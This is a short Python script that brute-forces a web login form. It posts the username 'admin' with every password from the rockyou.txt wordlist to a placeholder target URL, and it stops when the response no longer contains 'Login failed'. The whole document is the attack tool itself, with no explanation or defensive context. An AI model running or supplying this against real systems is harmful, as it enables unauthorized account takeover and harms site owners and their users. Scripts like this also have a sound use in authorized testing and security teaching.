#!/usr/bin/python

import requests

target_url = "Input Target Url"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("rockyou.txt", "r") as wordlist_file:
    for line in wordlist_file:
        password = line.strip()
        data_dict["password"] = password
        response = requests.post(target_url, data=data_dict)

        if "Login failed" not in response.content:
            print("[+] Password found >> " + password)
            exit()
